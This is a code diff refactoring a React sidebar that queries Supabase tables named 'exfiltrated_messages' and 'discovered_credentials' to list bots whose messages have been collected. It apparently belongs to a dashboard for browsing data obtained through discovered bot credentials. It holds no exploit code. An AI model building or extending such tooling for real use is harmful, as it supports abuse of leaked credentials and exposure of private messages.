@@ -41,49 +41,42 @@ export default function Sidebar({
         async function fetchCreds() {
             console.log("[Sidebar] Fetching credentials...");
 
-            // Query exfiltrated_messages and group by credential_id
-            // This gets us unique credentials that have messages
-            // NOTE: We deliberately exclude bot_token for security
-            const { data, error } = await supabase
-                .from("exfiltrated_messages")
-                .select("credential_id, discovered_credentials(id, created_at, source, meta)")
-                .order("created_at", { ascending: false });
+            try {
+                // ✅ FIXED: Efficient two-step query
+                // Step 1: Get unique credential_ids from messages (small payload)
+                const { data: msgs } = await supabase
+                    .from("exfiltrated_messages")
+                    .select("credential_id")
+                    .limit(10000);
 
-            if (error) {
-                console.error("[Sidebar] Error fetching messages:", error.message);
-                return;
-            }
+                const credIdsSet = new Set((msgs || []).map(m => m.credential_id));
+                const credIds = Array.from(credIdsSet);
 
-            console.log(`[Sidebar] Received ${data?.length || 0} message records`);
+                console.log(`[Sidebar] Found ${credIds.length} unique credentials with messages`);
 
-            if (data) {
-                // Group by credential_id to get unique credentials
-                const uniqueCredMap = new Map<string, Credential>();
+                if (credIds.length === 0) {
+                    setCredentials([]);
+                    return;
+                }
 
-                // Cast data since supabase return type inference might vary
-                const messages = data as unknown as MessageWithCredential[];
+                // Step 2: Fetch those credentials
+                const { data: creds, error } = await supabase
+                    .from("discovered_credentials")
+                    .select("id, created_at, source, meta")
+                    .in("id", credIds);
 
-                messages.forEach((msg) => {
-                    const credId = msg.credential_id;
-                    // Supabase returns joined data as a single object for Many-to-One
-                    const credInfo = msg.discovered_credentials;
+                if (error) {
+                    console.error("[Sidebar] Error fetching credentials:", error.message);
+                    return;
+                }
 
-                    if (credInfo && !uniqueCredMap.has(credId)) {
-                        uniqueCredMap.set(credId, {
-                            id: credInfo.id,
-                            created_at: credInfo.created_at,
-                            source: credInfo.source,
-                            meta: credInfo.meta
-                        });
-                    }
-                });
-
-                // Convert map to array and sort by created_at desc
-                const uniqueCreds = Array.from(uniqueCredMap.values())
+                const sorted = (creds || [])
                     .sort((a, b) => new Date(b.created_at).getTime() - new Date(a.created_at).getTime());
 
-                console.log(`[Sidebar] Found ${uniqueCreds.length} unique bots (sources: ${[...new Set(uniqueCreds.map(c => c.source))].join(', ') || 'none'})`);
-                setCredentials(uniqueCreds);
+                console.log(`[Sidebar] Found ${sorted.length} bots with messages (sources: ${[...new Set(sorted.map(c => c.source))].join(', ') || 'none'})`);
+                setCredentials(sorted);
+            } catch (err) {
+                console.error("[Sidebar] Exception fetching creds:", err);
             }
         }
 
